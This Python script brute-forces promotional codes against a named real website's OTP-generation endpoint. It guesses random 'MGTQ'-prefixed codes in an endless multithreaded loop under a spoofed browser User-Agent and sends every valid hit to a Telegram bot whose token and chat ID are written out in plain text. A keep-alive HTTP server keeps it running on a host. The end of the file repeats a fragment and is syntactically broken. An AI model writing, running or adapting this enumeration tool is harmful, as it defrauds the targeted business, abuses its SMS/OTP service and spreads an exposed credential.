import os
import time
import random
import string
import threading
import json
import requests
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, BaseHTTPRequestHandler
from collections import defaultdict

# ================== CONFIGURATION ==================
BASE_URL = "https://www.ossw.theofferclub.in"
OTP_ENDPOINT = f"{BASE_URL}/home/generateOTP"
TEST_MOBILE = "9038529139"

NUM_CODES = 100000
MAX_WORKERS = 5
DELAY_PER_THREAD = 2.0
STATUS_INTERVAL = 100          # send status update every 100 checks

TELEGRAM_TOKEN = "8789555036:AAGw-EovbhVHoI81lD6QJ9AeFhn4eJNnFaY"
TELEGRAM_CHAT_ID = "5177144784"

print_lock = threading.Lock()
code_counter = 0
valid_counter = 0
last_status_sent = 0
last_error_sent = 0
error_counts = defaultdict(int)

# ================== TELEGRAM ==================
def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=5)
    except Exception as e:
        print(f"Telegram send failed: {e}")

def send_error_report(error_type, details):
    global last_error_sent
    now = time.time()
    # Throttle errors: send at most one error per minute per type
    if now - last_error_sent < 60:
        return
    last_error_sent = now
    error_counts[error_type] += 1
    msg = f"⚠️ ERROR [{error_type}]: {details}\nTotal {error_type} errors: {error_counts[error_type]}"
    send_telegram_message(msg)

# ================== CODE GENERATION ==================
def generate_random_code():
    prefix = "MGTQ"
    chars = string.ascii_uppercase + string.digits
    return prefix + ''.join(random.choices(chars, k=6))

# ================== CODE CHECKER WITH ERROR CAPTURE ==================
def check_code(code):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {"phone": TEST_MOBILE, "ccode": code}
    try:
        r = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=15)
        if r.status_code != 200:
            send_error_report("HTTP", f"Status {r.status_code} for {code}")
            return False
        try:
            json_resp = r.json()
            status = json_resp.get("status")
            if status == "success":
                return True
            elif status in ("failure", "code_failure"):
                # Normal invalid – no error
                return False
            else:
                send_error_report("UnknownStatus", f"Status '{status}' for {code}")
                return False
        except json.JSONDecodeError:
            send_error_report("JSONParse", f"Invalid JSON: {r.text[:100]}")
            return False
    except requests.exceptions.Timeout:
        send_error_report("Timeout", f"Request timeout for {code}")
        return False
    except requests.exceptions.ConnectionError:
        send_error_report("ConnectionError", f"Cannot connect to {BASE_URL}")
        return False
    except Exception as e:
        send_error_report("Generic", f"{type(e).__name__}: {str(e)[:100]}")
        return False

# ================== PROCESS CODE ==================
def process_code(code):
    global code_counter, valid_counter, last_status_sent
    is_valid = check_code(code)
    with print_lock:
        code_counter += 1
        if is_valid:
            valid_counter += 1
            symbol = "✅"
            # Send valid code immediately
            msg = f"🎉 VALID CODE!\n🔑 {code}\n📱 {TEST_MOBILE}\n⏰ {time.ctime()}"
            send_telegram_message(msg)
            with open("valid_codes.txt", "a") as f:
                f.write(f"{code} | {TEST_MOBILE} | {time.ctime()}\n")
        else:
            symbol = "❌"
        print(f"{symbol} {code}")

        # Send periodic status update every STATUS_INTERVAL codes
        if code_counter % STATUS_INTERVAL == 0:
            status_msg = f"📊 Status: {code_counter} codes checked, {valid_counter} valid found."
            send_telegram_message(status_msg)
            last_status_sent = time.time()
    
    time.sleep(DELAY_PER_THREAD)

# ================== VALIDATOR LOOP ==================
def run_validator():
    send_telegram_message("🚀 Validator started with periodic updates (every 100 codes) and error reporting.")
    send_telegram_message(f"🎯 Target mobile: {TEST_MOBILE}")
    print("Validator running. Updates will be sent every 100 codes.")
    while True:
        codes = [generate_random_code() for _ in range(NUM_CODES)]
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            executor.map(process_code, codes)
        print(f"Batch done. Total checked: {code_counter}, valid: {valid_counter}")
        time.sleep(5)

# ================== HTTP KEEP-ALIVE ==================
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Validator running - with error reporting")
    def log_message(self, format, *args):
        pass

def start_http_server():
    port = int(os.environ.get("PORT", 5000))
    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f"HTTP keep-alive server on port {port}")
    server.serve_forever()

# ================== MAIN ==================
if __name__ == "__main__":
    threading.Thread(target=run_validator, daemon=True).start()
    start_http_server()        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Validator running - debug mode")
    def log_message(self, format, *args):
        pass

def start_http_server():
    port = int(os.environ.get("PORT", 5000))
    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f"HTTP keep-alive server on port {port}")
    server.serve_forever()

# ================== MAIN ==================
if __name__ == "__main__":
    threading.Thread(target=run_validator, daemon=True).start()
    start_http_server()
